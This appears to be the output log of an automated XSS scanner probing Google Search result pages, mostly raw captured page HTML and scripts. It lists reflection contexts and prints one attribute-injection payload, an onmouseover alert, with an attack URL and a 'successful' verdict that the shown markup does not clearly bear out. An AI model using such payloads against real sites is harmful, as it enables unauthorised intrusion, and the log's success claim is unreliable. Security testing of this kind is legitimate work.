+<a href="/preferences?hl=en&amp;prev=https://www.google.com/search?q%3D(uvw%2522xyz%2527yxz%253C/zxy%26as_sitesearch%3Dwww.acs.psu.edu" class="f9UGee" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" data-ved="2ahUKEwjdkt7vpuXoAhW0xzgGHRnBC_cQo_oBegQIARAK">
+<a href="/preferences?hl=en&amp;prev=https://www.google.com/search?q%3D(uvw%2522xyz%2527yxz%253C/zxy%26as_sitesearch%3Dwww.acs.psu.edu#languages" class="f9UGee" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" data-ved="2ahUKEwjdkt7vpuXoAhW0xzgGHRnBC_cQo_oBegQIARAL">
+<a class="f9UGee" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" href="/setprefs?safeui=on&amp;sig=0_ly97aLYEqPufhPTQJafCYipwrtU%3D&amp;prev=https://www.google.com/search?q%3D(uvw%2522xyz%2527yxz%253C/zxy%26as_sitesearch%3Dwww.acs.psu.edu" id="safesearch" data-ved="2ahUKEwjdkt7vpuXoAhW0xzgGHRnBC_cQo_oBegQIARAM">
+<a href="/advanced_search?q=(uvw%22xyz'yxz%3C/zxy+site:www.acs.psu.edu&amp;hl=en" class="f9UGee" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" data-ved="2ahUKEwjdkt7vpuXoAhW0xzgGHRnBC_cQo_oBegQIARAN">
+<meta content="0;url=/search?q=(uvw%22xyz%27yxz%3C/zxy+site:www.acs.psu.edu&amp;gbv=1&amp;sei=qE2UXt2eG7SP4-EPmYKvuA8" http-equiv="refresh">
+
+----------------------------------------------------------------------------------
+
+
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	False	True	True	False
+
+Attack Payloads for ATTR
+['" onmouseover="alert(1)']
+
+ATTR Attack Url: https://www.google.com/search?q=" onmouseover="alert(1)&as_sitesearch=www.acs.psu.edu
+
+=> ATTACK SUCCESSFUL with Payload: " onmouseover="alert(1)
+Detection of Payload: 
+<input class="gLFyf gsfi" maxlength="2048" name="q" type="text" jsaction="paste:puy29d" aria-autocomplete="both" aria-haspopup="false" autocapitalize="off" autocomplete="off" autocorrect="off" role="combobox" spellcheck="false" title="Search" value='" onmouseover="alert(1) site:www.acs.psu.edu' aria-label="Search" data-ved="0ahUKEwjXscLxpuXoAhV0wzgGHVovBkcQ39UDCAk">
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	True	True	True	True
+
+Attack Payloads for ATTR
+[]
+ENCODING     Presence	"	'	<	( 
+HTML:		True	False	False	True	False
+
+Attack Payloads for HTML
+[]
+ENCODING     Presence	"	'	<	( 
+HTML:		True	True	True	True	False
+
+Attack Payloads for HTML
+[]
+ENCODING     Presence	"	'	<	( 
+SCRIPT:		True	True	True	True	False
+
+Attack Payloads for SCRIPT
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+_______________________________________________________________________________________________________
+https://www.google.com/search?q=PennState&as_sitesearch=(uvw"xyz'yxz</zxy
+
+----------------------------------------------------------------------------------
+Attribute Context: [2]
+<input class="gLFyf gsfi" maxlength="2048" name="q" type="text" jsaction="paste:puy29d" aria-autocomplete="both" aria-haspopup="false" autocapitalize="off" autocomplete="off" autocorrect="off" role="combobox" spellcheck="false" title="Search" value="PennState site:(uvw%22xyz%27yxz%3C/zxy" aria-label="Search" data-ved="0ahUKEwiNn7LypuXoAhUNxzgGHeMYB6IQ39UDCAk">
+<div jsdata="GXYZuf;;BbddGM" jscontroller="G3eKy" jsl="$t t-w-XilABeKRA;$x 0;" class="r-i2FGa_Wvt1nI">
+
+----------------------------------------------------------------------------------
+HTML Context: [2]
+<title>PennState site:(uvw%22xyz%27yxz%3C/zxy - Google Search</title>
+<em>PennState site:(uvw%22xyz%27yxz%3C/zxy</em>
+
+----------------------------------------------------------------------------------
+Script Context: [1]
+<script nonce="OKg3O8bT3rQ0vZ6MQjBk8A==">(function(){google.ldi={};google.pim={};})();(function(){var u='/xjs/_/js/k\x3dxjs.s.en_GB.YlbWwcv8Rzo.O/ck\x3dxjs.s._psGpbc7COU.L.W.O/m\x3dFkg7bd,HcFEGb,IvlUe,MC8mtf,OF7gzc,RMhBfe,T4BAC,TJw5qb,TbaHGc,Y33vzc,ZyRBae,cdos,hsm,iDPoPb,jsa,mvYTse,tg8oTe,uz938c,vWNDde,ws9Tlc,yQ43ff,d,csi/am\x3dAAQAAMASgF13AJz_TQAAF8w4AAAggBvBxgIpIqEgAAGsuggCAQ/d\x3d1/dg\x3d2/ct\x3dzgms/rs\x3dACT90oGH5qsv6t9wsw0xPVUy40iHVnuuOQ';
+setTimeout(function(){var b=document;var a="SCRIPT";"application/xhtml+xml"===b.contentType&&(a=a.toLowerCase());a=b.createElement(a);a.src=u;google.timers&&google.timers.load&&google.tick&&google.tick("load","xjsls");document.body.appendChild(a)},0);})();(function(){window.google.xjsu='/xjs/_/js/k\x3dxjs.s.en_GB.YlbWwcv8Rzo.O/ck\x3dxjs.s._psGpbc7COU.L.W.O/m\x3dFkg7bd,HcFEGb,IvlUe,MC8mtf,OF7gzc,RMhBfe,T4BAC,TJw5qb,TbaHGc,Y33vzc,ZyRBae,cdos,hsm,iDPoPb,jsa,mvYTse,tg8oTe,uz938c,vWNDde,ws9Tlc,yQ43ff,d,csi/am\x3dAAQAAMASgF13AJz_TQAAF8w4AAAggBvBxgIpIqEgAAGsuggCAQ/d\x3d1/dg\x3d2/ct\x3dzgms/rs\x3dACT90oGH5qsv6t9wsw0xPVUy40iHVnuuOQ';})();function _DumpException(e){throw e;}
+function _F_installCss(c){}
+(function(){google.spjs=false;google.snet=true;google.em=[];google.emw=false;google.pdt=0;google.uwp=false;})();(function(){var pmc='{\x22Fkg7bd\x22:{},\x22HcFEGb\x22:{},\x22IvlUe\x22:{},\x22MC8mtf\x22:{},\x22OF7gzc\x22:{},\x22RMhBfe\x22:{},\x22T4BAC\x22:{},\x22TJw5qb\x22:{},\x22TbaHGc\x22:{},\x22Y33vzc\x22:{},\x22ZyRBae\x22:{},\x22aa\x22:{},\x22abd\x22:{\x22abd\x22:false,\x22deb\x22:false,\x22det\x22:false},\x22async\x22:{},\x22bgd\x22:{\x22ac\x22:true,\x22as\x22:true,\x22at\x22:0,\x22ea\x22:true,\x22ed\x22:0,\x22ei\x22:true,\x22el\x22:true,\x22ep\x22:true,\x22er\x22:true,\x22et\x22:0,\x22eu\x22:false,\x22wl\x22:false},\x22cdos\x22:{\x22cdobsel\x22:false},\x22csi\x22:{},\x22d\x22:{},\x22ddls\x22:{},\x22dvl\x22:{\x22cookie_secure\x22:true,\x22cookie_timeout\x22:86400,\x22driver_ui_type\x22:2,\x22jsc\x22:\x22[null,null,null,30000,null,null,null,2,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[\\\x2286400000\\\x22,\\\x22604800000\\\x22,2.0]\\n,null,1]\\n\x22,\x22mnr_crd\x22:\x221\x22,\x22msg_dsc\x22:\x22From your Internet address\x22,\x22msg_dsc_url\x22:\x22\x22,\x22msg_dvl\x22:\x22From your device\x22,\x22msg_err\x22:\x22Location unavailable\x22,\x22msg_gps\x22:\x22Using GPS\x22,\x22msg_unk\x22:\x22Unknown\x22,\x22msg_upd\x22:\x22Update location\x22,\x22msg_use\x22:\x22Use precise location\x22,\x22uul_text\x22:\x22Lahore\x22},\x22foot\x22:{\x22pf\x22:true,\x22po\x22:true,\x22qe\x22:false},\x22gf\x22:{\x22pid\x22:196},\x22hsm\x22:{},\x22iDPoPb\x22:{},\x22jsa\x22:{\x22csi\x22:true,\x22csir\x22:100},\x22kyn\x22:{},\x22llc\x22:{},\x22lli\x22:{},\x22lu\x22:{},\x22m\x22:{},\x22mUpTid\x22:{},\x22mpck\x22:{\x22me\x22:false},\x22mu\x22:{\x22murl\x22:\x22https://adservice.google.com/adsid/google/ui\x22},\x22mvYTse\x22:{},\x22sb_wiz\x22:{\x22rfs\x22:[],\x22stok\x22:\x22BYQLrpzv17hNEy1s6VZq0NsOU2A\x22},\x22sf\x22:{},\x22sonic\x22:{},\x22spch\x22:{\x22ae\x22:\x22Please check your microphone.  \\u003Ca href\x3d\\\x22https://support.google.com/chrome/?p\x3dui_voice_search\\\x22 target\x3d\\\x22_blank\\\x22\\u003ELearn more\\u003C/a\\u003E\x22,\x22hl\x22:\x22en-PK\x22,\x22im\x22:\x22Click \\u003Cb\\u003EAllow\\u003C/b\\u003E to start voice search\x22,\x22iw\x22:\x22Waiting...\x22,\x22lm\x22:\x22Listening...\x22,\x22lu\x22:\x22%1$s voice search not available\x22,\x22mb\x22:false,\x22ne\x22:\x22No Internet connection\x22,\x22nt\x22:\x22Didn\x27t get that. \\u003Cspan\\u003ETry again\\u003C/span\\u003E\x22,\x22nv\x22:\x22Please check your microphone and audio levels.  \\u003Ca href\x3d\\\x22https://support.google.com/chrome/?p\x3dui_voice_search\\\x22 target\x3d\\\x22_blank\\\x22\\u003ELearn more\\u003C/a\\u003E\x22,\x22pe\x22:\x22Voice search has been turned off.  \\u003Ca href\x3d\\\x22https://support.google.com/chrome/?p\x3dui_voice_search\\\x22 target\x3d\\\x22_blank\\\x22\\u003EDetails\\u003C/a\\u003E\x22,\x22rm\x22:\x22Speak now\x22},\x22tg8oTe\x22:{},\x22tl\x22:{\x22rvkey\x22:\x22AIzaSyC_9Rt88UMjzgg5pIVArnfuIVkJx4zCdTY\x22},\x22uz938c\x22:{},\x22vWNDde\x22:{},\x22vs\x22:{},\x22ws9Tlc\x22:{},\x22yQ43ff\x22:{}}';google.pmc=JSON.parse(pmc);})();(function(){var r=['sb_wiz','aa','abd','async','bgd','dvl','foot','kyn','lli','lu','m','mUpTid','mpck','mu','sf','sonic','spch','tl','vs','exdc'];google.plm(r);})();(function(){var m=[[["root",[["t-w-XilABeKRA","i2FGa_Wvt1nI","r-i2FGa_Wvt1nI",null,null,"exdc"]
+]
+,""]
+]
+]
+;google.jsc&&google.jsc.m(m);google.log('rfl','');})();(function(){var m=['BbddGE','[\x22psy-ab\x22,\x22gws-wiz\x22,\x22PennState site:(uvw%22xyz%27yxz%3C/zxy\x22,\x22\x22,null,1,0,0,11,\x22en\x22,\x22BYQLrpzv17hNEy1s6VZq0NsOU2A\x22,\x22\x22,\x22rk2UXo2QAY2O4-EP47GckAo\x22,0,\x22en-PK\x22,null,null,null,0,null,null,3,5,null,null,0,-1,0,0,0,\x22\x22,0,0,\x22\x22,null,0,null,0,null,\x22/suggest\x22,0,0,0,0,0]\n','BbddGI','[0,0,0,[null,null,[[[3,null,null,[null,[[\x22qdr_\x22,1,6]\n,[\x22qdr_h\x22,0,6]\n,[\x22qdr_d\x22,0,6]\n,[\x22qdr_w\x22,0,6]\n,[\x22qdr_m\x22,0,6]\n,[\x22qdr_y\x22,0,6]\n,[\x22cdr_opt\x22,0,1,[1,\x22Custom range...\x22,null,\x22cdr:1,cd_min:x,cd_max:x\x22,\x22\x22,\x22text\x22,\x22\x22,\x22\x22,6,1,[[[\x22q\x22,\x22PennState site:(uvw%22xyz%27yxz%3C/zxy\x22]\n]\n]\n,\x22cdr_opt\x22,\x225/23/2004\x22,0]\n]\n]\n,0]\n]\n,[3,null,null,[null,[[\x22li_\x22,1,6]\n,[\x22li_1\x22,0,6]\n]\n,1]\n]\n]\n,null,[\x22tbs\x22]\n]\n]\n,null,null,[null,[[\x22/search?q\\u003dPennState+site:(uvw%2522xyz%2527yxz%253C/zxy\\u0026source\\u003dlnms\x22,null,null,\x22All\x22,1,null,1,null,null,\x22WEB\x22,[0,2]\n,null,null,0]\n,[\x22/search?q\\u003dPennState+site:(uvw%2522xyz%2527yxz%253C/zxy\\u0026source\\u003dlnms\\u0026tbm\\u003disch\x22,null,null,\x22Images\x22,0,null,1,null,null,\x22IMAGES\x22,[6,2]\n,null,null,6]\n,[\x22/search?q\\u003dPennState+site:(uvw%2522xyz%2527yxz%253C/zxy\\u0026source\\u003dlnms\\u0026tbm\\u003dnws\x22,null,null,\x22News\x22,0,null,1,null,null,\x22NEWS\x22,[10,2]\n,null,null,10]\n,[\x22/search?q\\u003dPennState+site:(uvw%2522xyz%2527yxz%253C/zxy\\u0026source\\u003dlnms\\u0026tbm\\u003dvid\x22,null,null,\x22Videos\x22,0,null,1,null,null,\x22VIDEOS\x22,[13,2]\n,null,null,13]\n]\n,[[\x22/search?q\\u003dPennState+site:(uvw%2522xyz%2527yxz%253C/zxy\\u0026source\\u003dlnms\\u0026tbm\\u003dbks\x22,null,null,\x22Books\x22,0,null,1,null,null,\x22BOOKS\x22,[2,2]\n,null,null,2]\n,[\x22/search?q\\u003dPennState+site:(uvw%2522xyz%2527yxz%253C/zxy\\u0026source\\u003dlnms\\u0026tbm\\u003dfin\x22,null,null,\x22Finance\x22,0,null,1,null,null,\x22FINANCE\x22,[22,2]\n,null,null,22]\n]\n]\n,null,1]\n','BbddGM','[0,\x22inline\x22,2,2500,0,0]\n','BbddGQ','[null,null,1,30000,null,null,null,2,null,null,3,null,null,null,null,null,1,null,null,null,null,null,null,[31.506432,74.3473152]\n,null,null,null,null,0,null,null,null,null,null,null,null,0,\x221586777518\x22,null,null,null,null,null,1,null,null,[\x2286400000\x22,\x22604800000\x22,2.0]\n,null,1]\n','BbddGU','[\x22https://www.google.com.pk/domainless/read?igu\\u003d1\x22,\x22AFz9ztuKfvTZu0vIrQcBLwo8zBJNOXjvcA:1586777518469\x22,3]\n','BbddGY','[1,null,null,1261,1349,0]\n'];
+var a=m;window.W_jd=window.W_jd||{};for(var b=0;b<a.length;b+=2)window.W_jd[a[b]]=JSON.parse(a[b+1]);})();(function(){window.WIZ_global_data={"Yllh3e":"%.@.1586777518018445,104384269,2718374115]\n","zChJod":"%.@.]\n","pxO4Zd":"0","GWsdKe":"en-PK","SIsrTd":"false","LU5fGb":"false","w2btAe":"%.@.\"\",\"\",\"0\",null,null,null,1]\n","eptZe":"/_/WizRpcUi/","mXOY5d":"%.@.null,1]\n","fyLpDc":"","SsQ4x":"OKg3O8bT3rQ0vZ6MQjBk8A\u003d\u003d","rX9Pnb":"16","V0Bluc":"none","zhkRO":"%.@.1,1,1,1,1,1,0,0,0,1]\n","b1KZw":"#fff","seVajd":"rgba(0,0,0,.12)","iwHJId":"15","zHtpPb":"false","auaxA":"#222","h29koe":"32","BdVmgf":"16","Mlljec":"false","YXGVrd":"true","qDYzS":"0 2px 10px 0 rgba(0,0,0,0.2)","o28sBd":"false","PxA5sf":"rgba(0,0,0,.54)","u4NTBb":"40","L6WyEf":"true","uRoR4d":"false","BwgO5":"16","klgere":"invert(1) hue-rotate(180deg)","wB1JTc":"false","EJG4vf":"pointer","KVmtZc":"rgba(255,255,255,.3)","n1Whrf":"false","qmiCId":"true","NW4nA":"rgba(255,255,255,.7)","Nk1Bhf":"#4285f4","ymIfqf":"18","Utapxe":"-webkit-","xFbXr":"rgba(0,102,33,1)","a7rhWc":"false","oFa0q":"#fafafa","ppkaeb":"0","e2p8ee":"false","eo8dye":"#878787","hqg9c":"#1878f0","S1ZUDf":"true","W445Dc":"20","ib0wve":"rgba(153,153,153,.2)","rZYUef":"#f5f5f5","JcUGee":"rgba(0,0,0,.54)","PIn0Ab":"1px solid #DFE1E5","SezQgf":"500","xDKXr":"false","VXIo7d":"8px","Rnt1Qc":"false","KdGe5c":"false","A2aVpb":"50","wku5sd":"false","AYVQWe":"20px","k7G1xb":"15","N31mf":"false","bXvyY":"#fff","haqSDf":"rgba(0,0,0,.54)","y2Hs7d":"false","pPtK5":"6","S7nbec":"16","SfSmD":"#ebebeb","BW8dtd":"rgba(248, 248, 248, 1)","U6xP0":"#4285f4","gbf9Eb":"58","yFVHo":"true","I69zkb":"rgba(204,204,204,.25)","tyCgpc":"#fff","j9ZYRc":"true","srQSvc":"true","JyBo2c":"false","QldWK":"6","osNyZ":"1.0","kL6Xwb":"false","KgXmrd":"true","WnrBce":"rgba(0,0,0,.1)","pxDH4c":"#0f9d58","hWyTvf":"false","HWmJg":"#dcdcdc","s6Rzec":"0 16px","GTYTQ":"#ffeb3b","MoAfyf":"#fff","SuQiSc":"1.3","z1x4kc":"true","pDiOce":"false","QDXUyc":"#188038","vhCwfc":"false","xT28q":"false","i7mh3e":"16","LACYrf":"false","A5tF3b":"false","hgWJ8c":"false","qj36Ef":"#323232","B8Dib":"rgba(0,0,0,.87)","gjAni":"#3c4043","y519we":"true","qkXvHd":"500","WMBRj":"#009688","EqX55c":"652","fRkoq":"true","BoqNoc":"20px","jIrJIf":"14","X4DPRd":"true","D8A8he":"true","xBx7Dc":"36","IvNqzc":"true","rx1dvd":"#f3f3f3","QSF9Ec":"","hbfefd":"#1A73E8","By1ejd":"16","eXPt4e":"400","tqmosb":"#fff","V6eh7c":"16","pLhKvc":"0","KTkDB":"false","Dc0uuf":"16","buGAI":"16","B0husb":"true","y1HZEd":"false","GzC2p":"#fff","gir54":"0.4","tuTJ6d":"#b8b8b8","T1V3fc":"#f4b400","VbmVYd":"true","rsd6be":"1","owXwYb":"#f8f8f8","dAFa0e":"false","ToXxme":"#e5e5e5","kVbEH":"false","vIMrp":"true","KFdH8":"true","oyB9kf":"rgba(0,0,0,.87)","g635Ab":"2px","kvKIW":"false","KD9WYe":"#1A73E8","rRLesf":"0","TKn0F":"20px","ekXXzb":"13px","WyvaRd":"0 1px 1px rgba(0,0,0,.16)","VQfWj":"#c0c0c0","BYw9f":"false","wFGKdc":"false","FF58Bf":"true","fFepd":"-15","TUhOL":"#fafafa","XgWQKd":"true","abZ6pc":"#f9a825","nMRhJe":"false","tqXjO":"false","cdRSXc":"false","Vzh4p":"0px 7px 6px -5px #DFE1E5","LIYDac":"arial,sans-serif","j0DpSe":"false","PngPbb":"rgba(0,0,0,.87)","EuCkcd":"16","JpB3Ue":"60","lzJv9d":"#fff","RZ03Ve":"#5677fc","khoEPb":"#1a0dab","Fcb4A":"#1A73E8","bDOvJc":"false","Hzi6pf":"#DFE1E5","umYEvb":"false","UNVSy":"false","MiTaT":"#1A73E8","aUt4Tc":"false","Sgnmlc":"14px","Vdtb3d":"true","zhBJde":"false","SATNMc":"1px solid #dfe1e5","ruHO7c":"#dd191d","Ym5Ycb":"false","q7vEEb":"false","FbN3Qc":"rgba(0,0,0,.87)","rWPbFe":"rgba(255,255,255,1)","gqXETb":"#db4437","bmQ7Rb":"false","iDTSkb":"true","JVBnre":"false","p7BdKe":"true","jg5SCd":"false","JRGsye":"none","prFQBe":"#ebebeb","bmAEG":"#d9d9d9","PPUcAe":"0px 0px 8px rgba(32, 33, 36, .24)","xeVOLe":"#689f38","lLCPB":"true","z70S0c":"false","UduJSb":"%.@.\"0 0\",0,0,20,20,\"/images/searchbox/desktop_searchbox_sprites302_hr.png\",\"20px\"]\n","Tae7A":"true","xz9C5b":"true","lVRwic":"false","EgTnfe":"true","wlwuHd":"false","eGDqv":"false","UnFEre":"16","LnZAkd":"false","fjc61":"false","iryGqc":"2","AwPxw":"false","KnXmRc":"10","H7aRye":"0px 5px 26px 0px rgba(0, 0, 0, 0.22), 0px 20px 28px 0px rgba(0, 0, 0, 0.30)","voc95c":"false","AP8pqf":"rgba(0,0,0,.12)","ZMFELd":"false","aKuscd":"#AECBFA","SpZHZd":"true","sBpVac":"rgba(0,0,0,.26)","SidP2e":"rgba(248, 248, 248, 0)","imHXAf":"true","HjM8R":"#FFF","K2vQjf":"#f8f8f8","ODgkgd":"#fff","xvI8we":"#212121","OqjdAf":"true","sPiebd":"false","o07h3e":"0 4px 5px rgba(0,0,0,.16)","PuOePe":"false","FydCC":"true","dTMnbc":"false","bVUXme":"25","QA73ad":"false","NvsKMd":"true","o9mzkf":"false","kePaAc":"-4","ENmP1c":"rgba(204,204,204,.15)","ZLr84e":"true","AQEr7b":"#c6c6c6","AYXCHc":"false","fQC6Cf":"2px","kkVYtc":"false","NIYCKf":"28","WxHUzd":"true","FYBlgf":"false","in3Ilb":"#222","ConpTc":"false","X1bUEc":"arial,sans-serif-medium,sans-serif","v44rSc":"#70757a","pch72b":"false","PYrjqe":"40","MOPyub":"15","ZxI7Af":"#fafafa","iKzRxb":"#5f6368","tpLZye":"#fff","VnH1Zb":"normal","RJegIe":"#fffff0","a8Umdd":"rgba(153,153,153,.4)","aD6AQe":"#757575","OQZvxe":"0 2px 10px 0 rgba(0,0,0,0.2)","EiEfXb":"#ebebeb","AEMHld":"#eeeeee","OjG6Qc":"#000","X4yPd":"#1c3aa9","tJ4Jdf":"11","eE52Jd":"#5f6368","IfHuyb":"rgba(0,0,0,.54)","RpI44b":"#ebebeb","WWz0vd":"false","mJempe":"13","YWHUvb":"18px","FiZWae":"32","ZzVVh":"false","QnH6ad":"16","iniaFd":"true","F4ULTd":"true","R9GQh":"#fff","ue6nDb":"Roboto-Medium,Roboto-Regular","Na6wt":"#e1e1e1"};window.IJ_values=["#fff","rgba(0,102,33,1)","rgba(0,0,0,.87)","rgba(0,0,0,.54)","rgba(255,255,255,1)","rgba(255,255,255,.7)",false,"%.@.\"\",\"\",\"0\",null,null,null,1]\n","0","%.@.null,1]\n","%.@.]\n","OKg3O8bT3rQ0vZ6MQjBk8A\u003d\u003d","%.@.\"0 0\",0,0,20,20,\"/images/searchbox/desktop_searchbox_sprites302_hr.png\",\"20px\"]\n","en-PK",false,"","%.@.1586777518018445,104384269,2718374115]\n",false,"/_/WizRpcUi/"];})();google.x(null, function(){(function(){(function(){google.csct={};google.csct.ps='AOvVaw2L6wpVdlM9g4zwjRS6KAdg\x26ust\x3d1586863918064600';})();})();(function(){(function(){google.csct.pi=true;})();})();(function(){(function(){
+function f(){for(var c="&cshid="+google.cshid,d=document.querySelectorAll('[href^="/"]'),e=0,b;b=d[e++];){var a=b.getAttribute("href");a.match(/[\?|&](ei|ved)=/)&&-1==a.indexOf("cshid=")&&(-1==a.search("#")?b.setAttribute("href",a+c):(a=a.split("#"),b.setAttribute("href",a[0]+c+"#"+a[1])))}d=document.querySelectorAll("[ping]");for(e=0;b=d[e++];)a=b.getAttribute("ping"),-1==a.indexOf("cshid=")&&b.setAttribute("ping",a+c)};google.csh=google.csh||{};google.csh.ict=function(c){google.cshid&&(c&&window.MutationObserver?google.dclc(function(){(new MutationObserver(f)).observe(document.querySelector("body"),{attributes:!0,childList:!0,subtree:!0,characterData:!0})}):google.dclc(f))};}).call(this);})();(function(){(function(){var umo=false;google.csh.ict(umo);})();})();(function(){window.jsl=window.jsl||{};window.jsl.dh=window.jsl.dh||function(i,c,d){try{var e=document.getElementById(i);if(e){e.innerHTML=c;if(d){d();}}else{if(window.jsl.el){window.jsl.el(new Error('Missing ID.'),{'id':i});}}}catch(e){if(window.jsl.el){window.jsl.el(new Error('jsl.dh'));}}};})();(function(){window.jsl.dh('hdtbMenus','\x3cdiv class\x3d\x22hdtb-mn-cont\x22\x3e\x3cdiv id\x3d\x22XJDHvf\x22\x3e\x3c/div\x3e\x3cdiv class\x3d\x22hdtb-mn-hd\x22 aria-haspopup\x3d\x22true\x22 role\x3d\x22button\x22 tabindex\x3d\x220\x22\x3e\x3cdiv class\x3d\x22mn-hd-txt\x22\x3eAny time\x3c/div\x3e\x3cspan class\x3d\x22mn-dwn-arw\x22\x3e\x3c/span\x3e\x3c/div\x3e\x3cul class\x3d\x22hdtbU hdtb-mn-c\x22\x3e\x3cli class\x3d\x22hdtbItm hdtbSel\x22 id\x3d\x22qdr_\x22 tabindex\x3d\x220\x22\x3eAny time\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22qdr_h\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3dPennState+site:(uvw%2522xyz%2527yxz%253C/zxy\x26amp;source\x3dlnt\x26amp;tbs\x3dqdr:h\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwiNn7LypuXoAhUNxzgGHeMYB6IQpwV6BAgBEBY\x22\x3ePast hour\x3c/a\x3e\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22qdr_d\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3dPennState+site:(uvw%2522xyz%2527yxz%253C/zxy\x26amp;source\x3dlnt\x26amp;tbs\x3dqdr:d\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwiNn7LypuXoAhUNxzgGHeMYB6IQpwV6BAgBEBc\x22\x3ePast 24 hours\x3c/a\x3e\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22qdr_w\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3dPennState+site:(uvw%2522xyz%2527yxz%253C/zxy\x26amp;source\x3dlnt\x26amp;tbs\x3dqdr:w\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwiNn7LypuXoAhUNxzgGHeMYB6IQpwV6BAgBEBg\x22\x3ePast week\x3c/a\x3e\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22qdr_m\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3dPennState+site:(uvw%2522xyz%2527yxz%253C/zxy\x26amp;source\x3dlnt\x26amp;tbs\x3dqdr:m\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwiNn7LypuXoAhUNxzgGHeMYB6IQpwV6BAgBEBk\x22\x3ePast month\x3c/a\x3e\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22qdr_y\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3dPennState+site:(uvw%2522xyz%2527yxz%253C/zxy\x26amp;source\x3dlnt\x26amp;tbs\x3dqdr:y\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwiNn7LypuXoAhUNxzgGHeMYB6IQpwV6BAgBEBo\x22\x3ePast year\x3c/a\x3e\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22vjyzWd\x22\x3e\x3cdiv jscontroller\x3d\x22Uuupec\x22 data-m\x3d\x22true\x22\x3e\x3cspan class\x3d\x22q\x22 id\x3d\x22cdrlnk\x22 tabindex\x3d\x220\x22 jsaction\x3d\x22EEGHee\x22 data-ved\x3d\x222ahUKEwiNn7LypuXoAhUNxzgGHeMYB6IQpwV6BAgBEBs\x22\x3eCustom range...\x3c/span\x3e\x3cdiv class\x3d\x22n5Ug4b\x22 style\x3d\x22display:none\x22\x3e\x3cdiv class\x3d\x22vOvh1b\x22 jsaction\x3d\x22xp3IKd\x22\x3e\x3c/div\x3e\x3cdiv class\x3d\x22J6UZg\x22\x3e\x3cdiv class\x3d\x22Jy9Ore\x22\x3eCustomised date range\x3c/div\x3e\x3clabel class\x3d\x22Qtsmnf tmDYm\x22 for\x3d\x22OouJcb\x22\x3eFrom\x3c/label\x3e\x3clabel class\x3d\x22Qtsmnf iWBKNe\x22 for\x3d\x22rzG2be\x22\x3eTo\x3c/label\x3e\x3cdiv class\x3d\x22Gwgzqd\x22 role\x3d\x22button\x22 tabindex\x3d\x220\x22 jsaction\x3d\x22xp3IKd\x22\x3e\x3c/div\x3e\x3cdiv class\x3d\x22NwEGxd\x22\x3e\x3cdiv class\x3d\x22qomYCd\x22\x3e\x3c/div\x3e\x3cform action\x3d\x22/search\x22 class\x3d\x22T3kYXe\x22 method\x3d\x22get\x22\x3e\x3cinput name\x3d\x22q\x22 value\x3d\x22PennState site:(uvw%22xyz%27yxz%3C/zxy\x22 type\x3d\x22hidden\x22\x3e\x3cinput name\x3d\x22source\x22 type\x3d\x22hidden\x22 value\x3d\x22lnt\x22\x3e\x3cinput value\x3d\x22cdr:1,cd_min:x,cd_max:x\x22 id\x3d\x22HjtPBb\x22 name\x3d\x22tbs\x22 type\x3d\x22hidden\x22\x3e\x3cinput value\x3d\x22\x22 name\x3d\x22tbm\x22 type\x3d\x22hidden\x22\x3e\x3cinput class\x3d\x22OouJcb ktf mini\x22 type\x3d\x22text\x22 value\x3d\x22\x22 autocomplete\x3d\x22off\x22 id\x3d\x22OouJcb\x22 tabindex\x3d\x220\x22 jsaction\x3d\x22focus:daRB0b\x22\x3e\x3cinput class\x3d\x22rzG2be ktf mini\x22 type\x3d\x22text\x22 value\x3d\x22\x22 autocomplete\x3d\x22off\x22 id\x3d\x22rzG2be\x22 tabindex\x3d\x220\x22 jsaction\x3d\x22focus:daRB0b\x22\x3e\x3cinput class\x3d\x22Ru1Ao ksb mini\x22 value\x3d\x22Go\x22 tabindex\x3d\x220\x22 type\x3d\x22submit\x22 